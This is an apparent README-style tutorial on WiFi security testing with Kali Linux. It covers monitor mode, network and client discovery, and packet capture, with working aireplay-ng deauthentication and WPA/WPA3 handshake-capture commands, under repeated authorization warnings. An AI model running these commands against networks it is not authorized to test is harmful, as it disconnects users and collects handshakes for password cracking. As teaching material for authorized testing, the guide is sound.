# WiFi Security Testing Guide

This repository contains documentation for educational WiFi security testing using Kali Linux. This guide is strictly for **educational purposes** and authorized security testing only.

> **⚠️ IMPORTANT:** Unauthorized network penetration is illegal in most jurisdictions. Always obtain proper written authorization before performing any security testing. Use these techniques only on networks you own or have explicit permission to test.

## Prerequisites

- Kali Linux (2023.1 or newer)
- Compatible wireless adapter with monitor mode support
- Basic understanding of networking concepts
- Legal authorization to test the target network

## Setup and Discovery

### Check Network Interfaces

First, identify your wireless interfaces:

```bash
# Show all network interfaces
ip a

# Alternative for network interface details
iw dev
```

### Manage Wireless Services

Before starting, ensure no conflicting services are running:

```bash
# Stop potentially interfering services
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# To restore normal networking after testing
# sudo systemctl start NetworkManager
# sudo systemctl start wpa_supplicant
```

## Monitor Mode and Network Discovery

### Enable Monitor Mode

Using Airmon-ng (traditional method):

```bash
# Kill processes that might interfere
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start <interface>
```

Using iw (modern alternative):

```bash
# Set interface down
sudo ip link set <interface> down

# Enable monitor mode
sudo iw <interface> set monitor control

# Bring interface back up
sudo ip link set <interface> up
```

### Scan for WiFi Networks

```bash
# Basic scan for nearby networks
sudo airodump-ng <monitor_interface>

# For a more modern approach with extended information
sudo airodump-ng <monitor_interface> --band abg --wps --manufacturer
```

### Target Network Analysis

To focus on a specific network and collect more detailed information:

```bash
# Focus on specific network and save capture
sudo airodump-ng --channel <channel> --bssid <BSSID> --write <capture_filename> <monitor_interface>
```

## Client Discovery and Traffic Analysis

### Identify Connected Clients

```bash
# Shows devices connected to the selected WiFi network
sudo airodump-ng --channel <channel> --bssid <BSSID> <monitor_interface>
```

### Packet Capture and Analysis

```bash
# Capture traffic in pcap format for later analysis
sudo airodump-ng --channel <channel> --bssid <BSSID> --output-format pcap --write <filename> <monitor_interface>

# Analyze captured packets
wireshark <filename>-01.cap
```

## Security Testing Techniques

### Client Deauthentication Test

This technique tests how a network handles disconnection events:

```bash
# Broadcast deauthentication (all clients)
sudo aireplay-ng --deauth <num_packets> -a <AP_BSSID> <monitor_interface>

# Targeted deauthentication (specific client)
sudo aireplay-ng --deauth <num_packets> -a <AP_BSSID> -c <client_MAC> <monitor_interface>
```

### WPA Handshake Capture

Capturing the WPA handshake for security analysis:

```bash
# Start capturing on the target network
sudo airodump-ng --channel <channel> --bssid <BSSID> --write <handshake_file> <monitor_interface>

# In another terminal, send deauth to force reconnection and capture handshake
sudo aireplay-ng --deauth 1 -a <BSSID> <monitor_interface>
```

### Modern WPA3 Security Testing

```bash
# Check if target network supports WPA3
sudo airodump-ng <monitor_interface> | grep -i WPA3

# Attempt to capture SAE handshakes
sudo hcxdumptool -i <interface> -o <output_file>.pcapng --enable_status=1
```

## Advanced Analysis Tools

### WiFi Signal Quality Testing

```bash
# Install Wavemon (if not already installed)
sudo apt update && sudo apt install wavemon

# Run signal monitoring tool
wavemon
```

### Network Profile Analysis

```bash
# Install Kismet (if not already installed)
sudo apt update && sudo apt install kismet

# Run Kismet server
sudo kismet -c <interface>
```

## Cleanup

Always properly disable monitor mode and restore normal functioning when finished:

```bash
# Using airmon-ng
sudo airmon-ng stop <monitor_interface>

# Manual alternative
sudo ip link set <interface> down
sudo iw <interface> set type managed
sudo ip link set <interface> up

# Restart network services
sudo systemctl start NetworkManager
sudo systemctl start wpa_supplicant
```

## Additional Security Considerations

- **MAC Address Randomization**: Modern devices use MAC randomization to enhance privacy. This can affect client tracking.
- **Enterprise Security**: WPA/WPA2/WPA3-Enterprise environments require different testing approaches.
- **IoT Devices**: Consider the presence of IoT devices which may have unique security characteristics.

## Legal and Ethical Reminders

- Obtain written permission before any testing
- Document scope and methods of testing
- Report findings responsibly to network owners
- Never attempt to access or exfiltrate data
- Follow responsible disclosure procedures for any vulnerabilities identified

## Further Learning Resources

- [NIST SP 800-153](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-153.pdf) - Guidelines for Securing Wireless Local Area Networks
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [Kali Linux Wireless Penetration Testing](https://www.kali.org/docs/tutorials/)
- [WiFi Security Best Practices](https://csrc.nist.gov/publications/detail/sp/800-97/final)

---

This guide is maintained for educational purposes only. Contributors are not responsible for misuse of the information provided.
